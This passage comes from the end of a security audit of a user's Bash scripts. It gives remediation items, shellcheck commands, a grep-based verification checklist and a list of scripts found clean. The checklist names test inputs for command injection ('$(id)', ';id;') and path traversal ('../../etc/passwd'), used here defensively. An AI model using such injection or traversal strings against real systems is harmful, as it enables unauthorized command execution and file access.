| M-7 | `omasync-setup` | Validate hostname immediately after `input()` |
| M-8 | `omablue-bluetooth-autoconnect` | Add `XDG_RUNTIME_DIR` fallback and ownership check |
| M-9 | `omablue-launch-trivalent` | Validate profile ID against allowlist; add `--` terminator |

---

### Phase 4 — Low / Ongoing Hardening

Run `shellcheck` on every script and resolve all warnings. Then apply the low findings:

```bash
# Quick sweep
shellcheck /var/home/mino/Vault/mino/omablue/bin/omablue-*
shellcheck /var/home/mino/Vault/mino/omablue/bin/omasync*
shellcheck /var/home/mino/Vault/mino/omablue/bin/new-nmcli
```

Apply L-1 through L-9 per the Low Findings Summary table above.

---

## Verification Checklist

After completing all phases, verify the following before closing the audit:

- [ ] `grep -rn 'source "\$CFG' bin/omasync bin/omasync-setup` returns no results
- [ ] `grep -rn 'bash -lc\|bash -l -c' bin/omasync bin/omasync-setup` returns no results (or only safe forms)
- [ ] `grep -rn 'sed -i.*\$' bin/omasync-setup` returns no results
- [ ] `grep -rn '/tmp/omasync' bin/omasync bin/omasync-lib.sh` returns no results
- [ ] `grep -rn 'cat.*PID_FILE.*kill\|kill.*cat.*PID' bin/omablue-caffeine` returns no results
- [ ] `shellcheck bin/omablue-* bin/omasync*` returns no errors
- [ ] Manual test: malformed `.conf` file with `$(id)` does not execute
- [ ] Manual test: theme name `../../etc/passwd` is rejected
- [ ] Manual test: rofi hostname input with `;id;` is rejected
- [ ] Manual test: caffeine PID file containing `1` is rejected before `kill`

---

## Scripts with No Findings

These were read in full and are clean:

- `omablue-battery-remaining` — single `upower` read, no external input
- `omablue-brew-install`, `omablue-brew-remove` — constrained to `brew` list output
- `omablue-flatpak-install`, `omablue-flatpak-remove` — similarly constrained
- `omablue-mixer` — `wpctl` only, `VOL_VAL` validated as numeric
- `omablue-theme-current` — read-only
- `omablue-theme-selector` — passes output to `omablue-theme-set` (covered above)

---

*End of audit. Total findings: 3 Critical · 5 High · 9 Medium · 15 Low.*
